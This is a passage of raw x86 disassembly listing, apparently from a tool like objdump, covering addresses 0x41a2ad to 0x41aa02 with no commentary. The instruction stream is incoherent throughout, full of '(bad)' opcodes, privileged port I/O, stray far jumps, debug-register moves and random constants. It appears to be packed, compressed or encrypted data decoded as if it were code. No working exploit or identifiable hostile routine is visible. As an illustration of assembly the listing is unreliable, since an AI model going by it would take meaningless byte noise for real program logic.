  41a2ad:	inc    esp
  41a2ae:	ret    
  41a2af:	adc    eax,0xea784288
  41a2b4:	shr    DWORD PTR [ecx],0x20
  41a2b7:	aad    0x8c
  41a2b9:	ds sbb al,0x42
  41a2bc:	clc    
  41a2bd:	jae    0x41a29c
  41a2bf:	push   edx
  41a2c0:	je     0x41a2b7
  41a2c2:	inc    ebx
  41a2c3:	stos   DWORD PTR es:[edi],eax
  41a2c4:	xor    al,0x53
  41a2c6:	add    esp,DWORD PTR [edi]
  41a2c8:	mov    ds:0x12ffa6a6,al
  41a2cd:	xchg   ebp,eax
  41a2ce:	and    ecx,DWORD PTR [edi+esi*1+0x19505fed]
  41a2d5:	push   ebp
  41a2d6:	test   eax,0x8d424cb8
  41a2db:	(bad)  
  41a2dc:	in     al,dx
  41a2dd:	out    dx,eax
  41a2de:	fld    QWORD PTR [edi-0x73]
  41a2e1:	xor    DWORD PTR [ecx+0x1a],edi
  41a2e4:	xchg   ecx,eax
  41a2e5:	in     al,0x70
  41a2e7:	or     BYTE PTR [esi],0xf0
  41a2ea:	cmp    al,BYTE PTR [ecx-0x60110110]
  41a2f0:	push   ss
  41a2f1:	dec    ebp
  41a2f2:	dec    eax
  41a2f3:	sbb    BYTE PTR [edi+eiz*8],cl
  41a2f6:	int3   
  41a2f7:	(bad)  
  41a2f8:	dec    esi
  41a2f9:	shr    eax,cl
  41a2fb:	push   cs
  41a2fc:	scas   al,BYTE PTR es:[edi]
  41a2fd:	rol    DWORD PTR [ecx],cl
  41a2ff:	push   cs
  41a300:	sbb    BYTE PTR [edx-0x3ed3e62a],0xe8
  41a307:	scas   al,BYTE PTR es:[edi]
  41a308:	inc    esi
  41a309:	or     eax,0x5fc84d05
  41a30e:	and    eax,DWORD PTR [eax-0x6d]
  41a311:	inc    esi
  41a312:	cmc    
  41a313:	mov    cl,0x3d
  41a315:	xlat   BYTE PTR ds:[ebx]
  41a316:	dec    ebx
  41a317:	adc    DWORD PTR [esi+edx*4],esi
  41a31a:	rcl    bh,1
  41a31c:	adc    ecx,DWORD PTR [ecx+0x1a]
  41a31f:	dec    edi
  41a320:	shl    DWORD PTR [edx-0x3a],1
  41a323:	je     0x41a301
  41a325:	out    dx,eax
  41a326:	jmp    0x664e:0x3a0e6167
  41a32d:	enter  0x4405,0xed
  41a331:	adc    eax,0x3df58fb4
  41a336:	ret    0xa78
  41a339:	jne    0x41a340
  41a33b:	push   edi
  41a33c:	pusha  
  41a33d:	mov    cl,0xe1
  41a33f:	dec    eax
  41a340:	add    al,0x9a
  41a342:	enter  0xe95a,0x58
  41a346:	jl     0x41a345
  41a348:	(bad)  
  41a349:	jne    0x41a32a
  41a34b:	adc    al,BYTE PTR [edi-0x11]
  41a34e:	(bad)  
  41a34f:	out    dx,al
  41a350:	daa    
  41a351:	mov    eax,ds:0xf4ea485b
  41a356:	mov    esi,edx
  41a358:	mov    bl,0xf3
  41a35a:	xor    ebp,DWORD PTR [ebx]
  41a35c:	cmp    al,0xc6
  41a35e:	mov    edx,0x338abf0d
  41a363:	and    al,0xea
  41a365:	or     dl,ah
  41a367:	dec    ebp
  41a368:	bound  edx,QWORD PTR [ebx+0x407a143a]
  41a36e:	(bad)  
  41a36f:	mov    ebp,0x19452673
  41a374:	in     eax,dx
  41a375:	ja     0x41a333
  41a377:	sbb    al,0xa8
  41a379:	cmp    BYTE PTR [edi],dh
  41a37b:	push   esi
  41a37c:	ret    0x5f0
  41a37f:	add    eax,0x580191aa
  41a384:	mov    cl,0x8c
  41a386:	mov    BYTE PTR [edi+0x16e9d31f],ah
  41a38c:	(bad)  
  41a38d:	(bad)  
  41a38e:	add    eax,0xa334d95e
  41a393:	or     al,0xe9
  41a395:	fsubrp st(7),st
  41a397:	jge    0x41a367
  41a399:	popa   
  41a39a:	push   0x21baa895
  41a39f:	loop   0x41a358
  41a3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3a2:	gs out dx,al
  41a3a4:	sub    BYTE PTR ds:0xdc026ecd,cl
  41a3aa:	mov    ecx,DWORD PTR [ecx+0x56f9f906]
  41a3b0:	and    DWORD PTR [ebx],0x1b
  41a3b3:	mov    ch,0xac
  41a3b5:	out    0xcb,al
  41a3b7:	mov    edi,0xee222966
  41a3bc:	xlat   BYTE PTR ds:[ebx]
  41a3bd:	lods   al,BYTE PTR ds:[esi]
  41a3be:	fild   WORD PTR [esi]
  41a3c0:	lahf   
  41a3c1:	jl     0x41a3be
  41a3c3:	mov    edx,0xc0278575
  41a3c8:	dec    edx
  41a3c9:	fs and eax,0x87e05362
  41a3cf:	iret   
  41a3d0:	cwde   
  41a3d1:	mov    ah,0x1e
  41a3d3:	(bad)  
  41a3d4:	push   ebx
  41a3d5:	jno    0x41a447
  41a3d7:	jge    0x41a3a1
  41a3d9:	icebp  
  41a3da:	ins    DWORD PTR es:[edi],dx
  41a3db:	jp     0x41a411
  41a3dd:	add    DWORD PTR [esi-0xd],esp
  41a3e0:	mov    al,0x93
  41a3e2:	push   0x89bfa9c9
  41a3e7:	cmp    ch,dh
  41a3e9:	mov    dh,0x87
  41a3eb:	xlat   BYTE PTR ds:[ebx]
  41a3ec:	pop    edx
  41a3ed:	or     BYTE PTR [eax+0x63f28203],0xb3
  41a3f4:	jnp    0x41a45a
  41a3f6:	adc    DWORD PTR [ecx+0x1d],edx
  41a3f9:	mov    eax,ds:0x4de5c1ad
  41a3fe:	sbb    BYTE PTR [eax-0x57],al
  41a401:	outs   dx,BYTE PTR ds:[esi]
  41a402:	dec    ebp
  41a403:	int3   
  41a404:	add    dl,BYTE PTR [ebp-0x2630a225]
  41a40a:	(bad)  
  41a40b:	mov    ebx,0x8f05123e
  41a410:	push   ebx
  41a411:	call   0x8db4cd09
  41a416:	push   esi
  41a417:	lea    ebp,[edi]
  41a419:	out    0xc3,eax
  41a41b:	jb     0x41a3f9
  41a41d:	push   0xffffff8f
  41a41f:	xchg   ebx,eax
  41a420:	xchg   edi,eax
  41a421:	jo     0x41a3ab
  41a423:	or     bl,cl
  41a425:	sub    bh,0xc1
  41a428:	popf   
  41a429:	in     eax,dx
  41a42a:	mov    cl,0xf5
  41a42c:	shr    DWORD PTR [ebp-0x166e814e],cl
  41a432:	scas   eax,DWORD PTR es:[edi]
  41a433:	shr    BYTE PTR [esi],cl
  41a435:	adc    dl,al
  41a437:	test   al,0x90
  41a439:	jae    0x41a482
  41a43b:	pop    ebx
  41a43c:	nop
  41a43d:	retf   0x3cb5
  41a440:	lock jge 0x41a441
  41a443:	mov    eax,0xcd34d368
  41a448:	mov    al,0x54
  41a44a:	div    BYTE PTR [ecx-0x6579a6b3]
  41a450:	cmp    bl,BYTE PTR [ebx-0x30]
  41a453:	stc    
  41a454:	sub    eax,0x6276c7bc
  41a459:	leave  
  41a45a:	adc    eax,0x90c8acf1
  41a45f:	test   esi,esi
  41a461:	mov    dl,0x98
  41a463:	adc    al,0xac
  41a465:	imul   BYTE PTR [ebp+0x1f48e994]
  41a46b:	or     edi,ebp
  41a46d:	(bad)
  41a470:	and    DWORD PTR [eax-0x1d],edi
  41a473:	and    bh,BYTE PTR [ebp+0x28]
  41a476:	retf   
  41a477:	es push eax
  41a479:	mov    edi,0x68b88e1a
  41a47e:	sub    edx,DWORD PTR [ebx+0x3f]
  41a481:	jns    0x41a40d
  41a483:	ja     0x41a448
  41a485:	dec    eax
  41a486:	mov    bl,0xee
  41a488:	xor    eax,0xb37bc817
  41a48d:	mov    eax,0xfca3c8d8
  41a492:	aaa    
  41a493:	xchg   ebp,eax
  41a494:	or     BYTE PTR [ebx-0x3c582e5f],0x90
  41a49b:	fcomp  DWORD PTR [esi+ecx*1+0x5916e8b7]
  41a4a2:	aaa    
  41a4a3:	add    al,0xcb
  41a4a5:	js     0x41a48c
  41a4a7:	ds inc eax
  41a4a9:	push   ecx
  41a4aa:	(bad)  
  41a4ab:	or     ecx,DWORD PTR [ecx+0x1318310b]
  41a4b1:	(bad)  
  41a4b2:	inc    ebx
  41a4b3:	mov    ds:0xdb71bfaa,eax
  41a4b8:	test   al,0xb5
  41a4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4bb:	lahf   
  41a4bc:	dec    ebx
  41a4bd:	xor    ebx,DWORD PTR [ecx]
  41a4bf:	mov    esp,0x90ca8ee4
  41a4c4:	inc    edi
  41a4c5:	dec    esp
  41a4c6:	pavgb  mm3,QWORD PTR [ecx+0x7eee3f3b]
  41a4cd:	xchg   esi,eax
  41a4ce:	push   ds
  41a4cf:	sub    ah,BYTE PTR [edx+0x69]
  41a4d2:	xor    ebp,DWORD PTR [edx-0x2128c789]
  41a4d8:	adc    ebp,DWORD PTR [ebx]
  41a4da:	xchg   esi,eax
  41a4db:	ds xor esi,ebp
  41a4de:	inc    edx
  41a4df:	cli    
  41a4e0:	mov    ch,0x24
  41a4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e3:	dec    eax
  41a4e4:	mov    ebx,0x81516116
  41a4e9:	frstor [ecx-0x783c5a74]
  41a4ef:	inc    ebx
  41a4f0:	daa    
  41a4f1:	ret    
  41a4f2:	push   ebx
  41a4f3:	sbb    BYTE PTR ds:0xad3d1912,ch
  41a4f9:	push   edi
  41a4fa:	sar    DWORD PTR [edi-0x45864399],cl
  41a500:	jl     0x41a491
  41a502:	xchg   DWORD PTR [esi+0x53bad30a],ebp
  41a508:	popf   
  41a509:	cmp    BYTE PTR [edi-0xa],al
  41a50c:	ds (bad) 
  41a50f:	xchg   esi,eax
  41a510:	(bad)  
  41a511:	popa   
  41a512:	call   0x2906:0xbc624246
  41a519:	xchg   edx,eax
  41a51a:	cmp    dh,BYTE PTR [ebx-0x1ba262d1]
  41a520:	out    0xce,al
  41a522:	xor    eax,DWORD PTR [ebp-0x53ad713e]
  41a528:	imul   ecx,DWORD PTR [esi],0xff1a06cc
  41a52e:	jno    0x41a52d
  41a530:	(bad)  
  41a531:	push   0x61
  41a533:	push   ecx
  41a534:	mov    dh,0x94
  41a536:	outs   dx,DWORD PTR ds:[esi]
  41a537:	mov    DWORD PTR [edx],eax
  41a539:	inc    ebx
  41a53a:	pop    ebp
  41a53b:	push   cs
  41a53c:	(bad)  
  41a53d:	addr16 add eax,0xd0134a05
  41a543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a544:	mov    ds:0x83eb0c05,al
  41a549:	pop    ss
  41a54a:	(bad)  
  41a54b:	fistp  QWORD PTR [eax+ebp*4]
  41a54e:	loop   0x41a522
  41a550:	xor    dl,BYTE PTR [ebp-0x3a]
  41a553:	jp     0x41a597
  41a555:	js     0x41a4e1
  41a557:	sar    BYTE PTR [ecx-0x38315f48],1
  41a55d:	mov    BYTE PTR [ebp+0x1],0xeb
  41a561:	sub    BYTE PTR [ecx],ch
  41a563:	stc    
  41a564:	xchg   edx,eax
  41a565:	out    dx,al
  41a566:	mov    esp,0xb0a83792
  41a56b:	(bad)  
  41a56c:	stc    
  41a56d:	pop    ecx
  41a56e:	mov    cl,0xf9
  41a570:	pop    edi
  41a571:	mov    ebx,0x3308080
  41a576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a577:	aaa    
  41a578:	ret    0x2280
  41a57b:	pusha  
  41a57c:	test   DWORD PTR [esi+0x5d],0x5d9f80f8
  41a583:	in     eax,dx
  41a584:	lods   al,BYTE PTR ds:[esi]
  41a585:	retf   
  41a586:	bound  ecx,QWORD PTR [esi]
  41a588:	stos   DWORD PTR es:[edi],eax
  41a589:	into   
  41a58a:	jmp    0x4b91:0xeaa624f1
  41a591:	mov    edi,0xc814af05
  41a596:	pop    eax
  41a597:	sbb    bh,bh
  41a599:	not    dh
  41a59b:	lods   eax,DWORD PTR ds:[esi]
  41a59c:	jp     0x41a52f
  41a59e:	xor    al,0x8e
  41a5a0:	adc    bl,ch
  41a5a2:	cmp    al,0xd6
  41a5a4:	sti    
  41a5a5:	jne    0x41a5d6
  41a5a7:	loope  0x41a5b9
  41a5a9:	mov    cl,0x68
  41a5ab:	add    al,0xd9
  41a5ad:	xchg   edi,eax
  41a5ae:	and    cl,cl
  41a5b0:	out    0x85,al
  41a5b2:	inc    esp
  41a5b3:	pop    ecx
  41a5b4:	retf   0xf20a
  41a5b7:	or     DWORD PTR ds:0x6f9da192,0xffffffcd
  41a5be:	pop    esi
  41a5bf:	cmp    eax,0xee511750
  41a5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5c5:	and    BYTE PTR [ecx-0x7c],0x7e
  41a5c9:	xchg   edx,eax
  41a5ca:	mov    esi,DWORD PTR [edi]
  41a5cc:	jp     0x41a5b9
  41a5ce:	cmc    
  41a5cf:	jnp    0x41a58e
  41a5d1:	sbb    al,0x8a
  41a5d3:	mov    esp,0xef5ad5ca
  41a5d8:	rcr    DWORD PTR [ecx-0x75],cl
  41a5db:	cwde   
  41a5dc:	xor    esi,ebp
  41a5de:	jno    0x41a585
  41a5e0:	jecxz  0x41a570
  41a5e2:	ds sub esi,edi
  41a5e5:	inc    ebx
  41a5e6:	add    edx,DWORD PTR [eax-0x4c4c81ec]
  41a5ec:	out    dx,al
  41a5ed:	push   ebx
  41a5ee:	into   
  41a5ef:	in     al,0x81
  41a5f1:	cmp    dh,BYTE PTR [ebx+edi*1-0x24]
  41a5f5:	mov    edx,0x81e11907
  41a5fa:	sbb    al,0xb
  41a5fc:	dec    edi
  41a5fd:	mov    dl,0x99
  41a5ff:	and    esp,edi
  41a601:	cwde   
  41a602:	dec    esi
  41a603:	repz scas al,BYTE PTR es:[edi]
  41a605:	outs   dx,DWORD PTR ds:[esi]
  41a606:	in     al,dx
  41a607:	js     0x41a5ec
  41a609:	xlat   BYTE PTR ds:[ebx]
  41a60a:	ins    DWORD PTR es:[edi],dx
  41a60b:	out    dx,eax
  41a60c:	xor    al,0xb1
  41a60e:	mov    ebp,0xd06a6425
  41a613:	inc    edx
  41a614:	gs imul ebp
  41a617:	sub    eax,0x60b66817
  41a61c:	jle    0x41a5b5
  41a61e:	mov    edi,DWORD PTR [edx+eiz*8]
  41a621:	dec    esp
  41a622:	jno    0x41a5b5
  41a624:	adc    dl,BYTE PTR [ebx-0x77c549e4]
  41a62a:	aas    
  41a62b:	outs   dx,DWORD PTR ds:[esi]
  41a62c:	imul   edi,DWORD PTR [esi],0x31
  41a62f:	mov    ?,WORD PTR [esi-0x42]
  41a632:	rcr    BYTE PTR [ebx-0x1e],0xb
  41a636:	ins    DWORD PTR es:[edi],dx
  41a637:	je     0x41a5e4
  41a639:	cmp    al,0x21
  41a63b:	adc    ebp,ebp
  41a63d:	xor    DWORD PTR [edx],0x61
  41a640:	sbb    al,0xec
  41a642:	js     0x41a67f
  41a644:	push   es
  41a645:	int    0xfd
  41a647:	push   ebx
  41a648:	enter  0x7556,0x62
  41a64c:	loopne 0x41a663
  41a64e:	out    dx,eax
  41a64f:	mov    ch,0x27
  41a651:	cmp    al,0xf6
  41a653:	sbb    bh,bl
  41a655:	jne    0x41a619
  41a657:	mov    ch,0x8
  41a659:	mov    dh,0x33
  41a65b:	push   eax
  41a65c:	retf   
  41a65d:	push   edi
  41a65e:	or     DWORD PTR [ecx+0x52ee5066],0x32
  41a665:	icebp  
  41a666:	cmp    al,0xfb
  41a668:	inc    eax
  41a669:	dec    edi
  41a66a:	mov    ah,0xb8
  41a66c:	outs   dx,BYTE PTR ds:[esi]
  41a66d:	cwde   
  41a66e:	mov    eax,eax
  41a670:	cmp    DWORD PTR ds:0x368167af,ecx
  41a677:	aaa    
  41a678:	mov    ds,WORD PTR [edx+0x3a6e1b19]
  41a67e:	jnp    0x41a694
  41a680:	outs   dx,DWORD PTR ds:[esi]
  41a681:	xchg   edi,eax
  41a682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a683:	add    BYTE PTR [edi-0x74],ch
  41a686:	jno    0x41a637
  41a688:	addr16 jmp 0x34983b09
  41a68e:	sub    eax,0x6b28d984
  41a693:	dec    ecx
  41a694:	xor    BYTE PTR [edi+edx*8+0x6805a404],cl
  41a69b:	mov    al,ds:0x27c8498a
  41a6a0:	bound  ebx,QWORD PTR [ebp-0x72433fe7]
  41a6a6:	scas   eax,DWORD PTR es:[edi]
  41a6a7:	inc    eax
  41a6a8:	jns    0x41a6b1
  41a6aa:	lds    edx,FWORD PTR [ecx+0x3dc51129]
  41a6b0:	push   es
  41a6b1:	aad    0x17
  41a6b3:	clc    
  41a6b4:	jne    0x41a6ba
  41a6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6b7:	div    DWORD PTR [edi]
  41a6b9:	dec    esi
  41a6ba:	jns    0x41a6fd
  41a6bc:	mov    BYTE PTR [eax+0x2e],dl
  41a6bf:	ins    BYTE PTR es:[edi],dx
  41a6c0:	push   0xc0799c93
  41a6c5:	mov    dh,BYTE PTR [ebx]
  41a6c7:	sahf   
  41a6c8:	outs   dx,DWORD PTR ds:[esi]
  41a6c9:	sub    edi,esi
  41a6cb:	push   es
  41a6cc:	ret    0x275e
  41a6cf:	or     eax,0x6fe580a4
  41a6d4:	xchg   ecx,eax
  41a6d5:	js     0x41a71a
  41a6d7:	or     al,0xd3
  41a6d9:	push   0x670436ed
  41a6de:	fiadd  DWORD PTR [ebp+0x59a9bfd0]
  41a6e4:	pop    ebp
  41a6e5:	nop
  41a6e6:	adc    DWORD PTR [edi-0x42879e72],edi
  41a6ec:	mov    WORD PTR [ecx-0x4a],fs
  41a6ef:	mov    ebp,0x73517018
  41a6f4:	push   edx
  41a6f5:	inc    esi
  41a6f6:	jns    0x41a6c3
  41a6f8:	xor    dl,ch
  41a6fa:	sub    al,0xf9
  41a6fc:	cld    
  41a6fd:	stos   BYTE PTR es:[edi],al
  41a6fe:	adc    ebp,DWORD PTR [ecx-0x52]
  41a701:	ficomp DWORD PTR [ebx-0x28]
  41a704:	pop    edx
  41a705:	mov    ebp,0x4a86f42f
  41a70a:	retf   0xde4d
  41a70d:	lahf   
  41a70e:	and    al,BYTE PTR [ecx-0x57694968]
  41a714:	test   BYTE PTR [ebx+0x209e01bc],bl
  41a71a:	xor    eax,0x10c86e23
  41a71f:	sbb    ebx,DWORD PTR [edx]
  41a721:	mov    eax,ds:0xf68127e
  41a726:	repz cld 
  41a728:	adc    ecx,0x5ada6ec1
  41a72e:	clc    
  41a72f:	lds    ebx,FWORD PTR [esi+esi*8]
  41a732:	ret    0xd7e0
  41a735:	push   esp
  41a736:	dec    edx
  41a737:	xchg   edi,eax
  41a738:	jmp    0x41a6ba
  41a73a:	xlat   BYTE PTR ds:[ebx]
  41a73b:	mov    ebp,0x15543f64
  41a740:	out    dx,eax
  41a741:	mov    esp,0xbe08baab
  41a746:	mov    al,0x7c
  41a748:	fidiv  DWORD PTR [eax]
  41a74a:	aaa    
  41a74b:	aad    0x84
  41a74d:	push   ebp
  41a74e:	mov    edi,0xdd5d364e
  41a753:	loopne 0x41a75f
  41a755:	pop    edi
  41a756:	push   edi
  41a757:	bound  esp,QWORD PTR [ebp-0x24df8522]
  41a75d:	xchg   ebp,eax
  41a75e:	inc    ecx
  41a75f:	add    eax,0xc616f10d
  41a764:	xor    DWORD PTR [edi],0xfffffffb
  41a767:	je     0x41a776
  41a769:	xor    ecx,DWORD PTR [ecx-0x14]
  41a76c:	or     edi,DWORD PTR fs:[ebx-0x5cec0e7d]
  41a773:	xor    BYTE PTR [edx+0x6030553a],al
  41a779:	std    
  41a77a:	mov    cl,0xbe
  41a77c:	xor    DWORD PTR [edx-0x21531c56],edx
  41a782:	in     al,dx
  41a783:	arpl   cx,sp
  41a785:	cmp    dh,BYTE PTR [ecx]
  41a787:	jmp    0xda62233d
  41a78c:	dec    esp
  41a78d:	xchg   edi,eax
  41a78e:	adc    eax,0xbcd3c7b
  41a793:	xchg   ecx,eax
  41a794:	mov    ch,0x77
  41a796:	in     eax,0xcf
  41a798:	(bad)
  41a79b:	pop    edx
  41a79c:	push   ecx
  41a79d:	repz sub BYTE PTR [esi-0x56],bl
  41a7a1:	cdq    
  41a7a2:	fcomp  QWORD PTR [eax]
  41a7a4:	mov    cl,BYTE PTR [esi]
  41a7a6:	push   ds
  41a7a7:	test   BYTE PTR [edx-0x76],dh
  41a7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ab:	imul   ebp,DWORD PTR [ebp-0x3aeb47d9],0xffffff98
  41a7b2:	cmp    al,0x67
  41a7b4:	test   al,0x79
  41a7b6:	pop    edi
  41a7b7:	jno    0x41a76b
  41a7b9:	sub    DWORD PTR [edx],esp
  41a7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7bc:	imul   ecx,esi,0x7d
  41a7bf:	sbb    ch,BYTE PTR [ebx]
  41a7c1:	and    ebx,ebp
  41a7c3:	inc    edi
  41a7c4:	and    BYTE PTR [eax-0x63f4820c],dh
  41a7ca:	jnp    0x41a782
  41a7cc:	leave  
  41a7cd:	mov    eax,0xe2218c9a
  41a7d2:	and    BYTE PTR [esi],dl
  41a7d4:	inc    edi
  41a7d5:	push   ss
  41a7d6:	fstp   TBYTE PTR [edx+0x40024d8c]
  41a7dc:	in     al,dx
  41a7dd:	repnz xor eax,0x7d12c8e4
  41a7e3:	or     DWORD PTR [edi+edx*8-0x2e],0x3b
  41a7e8:	imul   ecx,DWORD PTR [eax+0x375ee389],0xfa6d73c3
  41a7f2:	inc    esi
  41a7f3:	dec    ebp
  41a7f4:	adc    ah,bh
  41a7f6:	adc    edi,edx
  41a7f8:	lea    esi,[ebp+edi*4+0x6f]
  41a7fc:	pushf  
  41a7fd:	push   edx
  41a7fe:	mov    DWORD PTR [ebx+0x1e],edx
  41a801:	add    esp,edx
  41a803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a804:	mov    ecx,0xbe89a136
  41a809:	pop    ds
  41a80a:	xlat   BYTE PTR ds:[ebx]
  41a80b:	dec    esi
  41a80c:	dec    ebp
  41a80d:	and    BYTE PTR [esi+eax*8-0x57],al
  41a811:	dec    eax
  41a812:	stos   DWORD PTR es:[edi],eax
  41a813:	and    ah,BYTE PTR [edi+eiz*8+0x7c4ebb4f]
  41a81a:	aad    0x58
  41a81c:	sub    eax,0x1b18f1d9
  41a821:	mov    db3,esp
  41a824:	mov    DWORD PTR [ecx-0x3e61a9f2],0xa8f2536f
  41a82e:	pop    ss
  41a82f:	jmp    0x3db97dc9
  41a834:	mov    dl,0x3a
  41a836:	sub    eax,0x768ee66
  41a83b:	inc    esi
  41a83c:	push   edx
  41a83d:	loopne 0x41a8a3
  41a83f:	jp     0x41a804
  41a841:	sub    BYTE PTR [ebx+0x71],al
  41a844:	xlat   BYTE PTR ds:[ebx]
  41a845:	and    DWORD PTR [edx+ebx*2],edx
  41a848:	call   0xe2f3:0xb27aa021
  41a84f:	leave  
  41a850:	jbe    0x41a873
  41a852:	icebp  
  41a853:	aas    
  41a854:	enter  0x9c73,0x64
  41a858:	pop    edi
  41a859:	jmp    0xa05f:0x8f346f68
  41a860:	inc    edx
  41a861:	ficom  DWORD PTR [edi-0x7]
  41a864:	sub    bh,BYTE PTR [ecx]
  41a866:	ins    BYTE PTR es:[edi],dx
  41a867:	push   ebx
  41a868:	xor    eax,0x75ead0f7
  41a86d:	and    al,0xda
  41a86f:	scas   eax,DWORD PTR es:[edi]
  41a870:	rol    ebx,1
  41a872:	sub    DWORD PTR [esi+0x3c1811c],esi
  41a878:	cmp    cl,bh
  41a87a:	add    DWORD PTR [edx-0x59171a24],0x43
  41a881:	inc    eax
  41a882:	test   BYTE PTR [ebx],0x9b
  41a885:	sar    DWORD PTR [ebp-0x47d186fd],cl
  41a88b:	clc    
  41a88c:	in     al,0x73
  41a88e:	jmp    0x35b5badc
  41a893:	xchg   edx,esp
  41a895:	aad    0xc0
  41a897:	mov    edx,0xe9376761
  41a89c:	cmp    BYTE PTR [esi+0x52b3d6f4],bh
  41a8a2:	inc    ebp
  41a8a3:	push   ss
  41a8a4:	dec    ebp
  41a8a5:	fld    DWORD PTR [esi]
  41a8a7:	mov    al,0xb6
  41a8a9:	inc    esi
  41a8aa:	out    0xfe,eax
  41a8ac:	(bad)  
  41a8ad:	push   ebp
  41a8ae:	xchg   edx,eax
  41a8af:	sbb    DWORD PTR [ecx+0x61de5a63],edi
  41a8b5:	out    0x6a,al
  41a8b7:	out    0x68,eax
  41a8b9:	dec    edx
  41a8ba:	inc    ebp
  41a8bb:	add    al,0x7f
  41a8bd:	inc    esp
  41a8be:	ja     0x41a866
  41a8c0:	mov    eax,ds:0x6b458725
  41a8c5:	shl    esi,1
  41a8c7:	icebp  
  41a8c8:	pushf  
  41a8c9:	push   DWORD PTR [ecx+ebx*1]
  41a8cc:	xchg   esp,eax
  41a8cd:	mov    ecx,0x2e5247a2
  41a8d2:	jmp    0x454dc45b
  41a8d7:	jae    0x41a8c9
  41a8d9:	add    DWORD PTR [ecx-0x35],ecx
  41a8dc:	push   edi
  41a8dd:	mov    edi,0x3b9d9089
  41a8e2:	ds jns 0x41a8ab
  41a8e5:	inc    edx
  41a8e6:	push   0xafe923cd
  41a8eb:	adc    al,ah
  41a8ed:	cmp    esp,edi
  41a8ef:	stc    
  41a8f0:	out    dx,al
  41a8f1:	fdiv   QWORD PTR [edi]
  41a8f3:	outs   dx,DWORD PTR ds:[esi]
  41a8f4:	and    ch,BYTE PTR [edi+eiz*2-0x38]
  41a8f8:	adc    BYTE PTR [ecx+0x4a52cf7],bl
  41a8fe:	jg     0x41a978
  41a900:	mov    ch,0x52
  41a902:	ret    0xbd15
  41a905:	int3   
  41a906:	test   ebx,edx
  41a908:	inc    ebp
  41a909:	hlt    
  41a90a:	punpcklwd mm4,DWORD PTR [edx-0x36]
  41a90e:	jne    0x41a892
  41a910:	je     0x41a92c
  41a912:	add    al,0xbe
  41a914:	sbb    bl,BYTE PTR [edx]
  41a916:	jo     0x41a8a7
  41a918:	les    esp,FWORD PTR [esi-0x3dc15bbb]
  41a91e:	(bad)  
  41a920:	ret    0x186a
  41a923:	test   DWORD PTR [eax-0x4e],esp
  41a926:	mov    ds:0xe4d5c436,al
  41a92b:	pop    ds
  41a92c:	sub    BYTE PTR [ebx-0x3f035d10],ch
  41a932:	(bad)  
  41a933:	or     esp,esi
  41a935:	mov    esp,0x4c204c25
  41a93a:	popf   
  41a93b:	ja     0x41a8e9
  41a93d:	push   ss
  41a93e:	xchg   esi,eax
  41a93f:	jg     0x41a929
  41a941:	sbb    bl,BYTE PTR [esi]
  41a943:	cld    
  41a944:	aad    0x61
  41a946:	in     eax,0x6e
  41a948:	sub    BYTE PTR [eax-0x5d96a389],bl
  41a94e:	fadd   DWORD PTR [esi]
  41a950:	pusha  
  41a951:	in     eax,0x66
  41a953:	daa    
  41a954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a955:	out    0x27,al
  41a957:	adc    dl,BYTE PTR [eax+eiz*4-0x73]
  41a95b:	rcl    BYTE PTR [edi],0x2e
  41a95e:	adc    ebx,esp
  41a960:	jp     0x41a9ce
  41a962:	mov    dl,0xa0
  41a964:	push   0x6
  41a966:	lahf   
  41a967:	repz add eax,0x167b2ced
  41a96d:	sbb    al,0x74
  41a96f:	and    DWORD PTR [ebp-0x61],0x22
  41a973:	std    
  41a974:	idiv   bl
  41a976:	jbe    0x41a902
  41a978:	mov    ebx,0x3286172
  41a97d:	ins    DWORD PTR es:[edi],dx
  41a97e:	jns    0x41a967
  41a980:	sbb    eax,0xa3ed2c4f
  41a985:	pop    ebx
  41a986:	pusha  
  41a987:	std    
  41a988:	fsub   st,st(2)
  41a98a:	iret   
  41a98b:	add    DWORD PTR [ecx],esi
  41a98d:	out    0x36,eax
  41a98f:	popa   
  41a990:	ds or  eax,0x70bbb2f4
  41a996:	hlt    
  41a997:	jg     0x41a99b
  41a999:	push   esp
  41a99a:	jl     0x41a9f2
  41a99c:	push   ebx
  41a99d:	pop    ds
  41a99e:	pop    es
  41a99f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9a0:	out    dx,al
  41a9a1:	scas   al,BYTE PTR es:[edi]
  41a9a2:	or     BYTE PTR [ebp+eax*2-0x1f],dh
  41a9a6:	pop    edx
  41a9a7:	vpmacssdql xmm1,xmm5,XMMWORD PTR [ebx+0x25fa4bf1],xmm0
  41a9b1:	outs   dx,DWORD PTR ds:[esi]
  41a9b2:	les    edi,FWORD PTR [edx+0x38]
  41a9b5:	lea    eax,[edi-0x480b661f]
  41a9bb:	loopne 0x41aa12
  41a9bd:	mov    bh,BYTE PTR [edx]
  41a9bf:	in     eax,0x2e
  41a9c1:	and    al,BYTE PTR es:[ebx+edi*2]
  41a9c5:	xchg   esi,eax
  41a9c6:	sub    eax,0x837101f1
  41a9cb:	mov    dl,0x3a
  41a9cd:	(bad)  
  41a9cf:	loop   0x41a9d5
  41a9d1:	add    eax,0xe6ca54de
  41a9d6:	out    dx,eax
  41a9d7:	pop    ebx
  41a9d8:	fstp   DWORD PTR [esi-0x79]
  41a9db:	test   al,0x17
  41a9dd:	jns    0x41a9e6
  41a9df:	clc    
  41a9e0:	(bad)  [edx+0x2fe623bf]
  41a9e6:	jnp    0x41a9fe
  41a9e8:	jns    0x41aa61
  41a9ea:	loope  0x41aa1d
  41a9ec:	cld    
  41a9ed:	and    al,0x41
  41a9ef:	dec    ebp
  41a9f0:	pop    es
  41a9f1:	jne    0x41a9e5
  41a9f3:	mov    al,0x7a
  41a9f5:	and    BYTE PTR [ebp+0x66e6e17],bh
  41a9fb:	or     al,0x59
  41a9fd:	cdq    
  41a9fe:	inc    esi
  41a9ff:	mov    WORD PTR [ebx+0xd],ds
  41aa02:	sar    al,0xe8
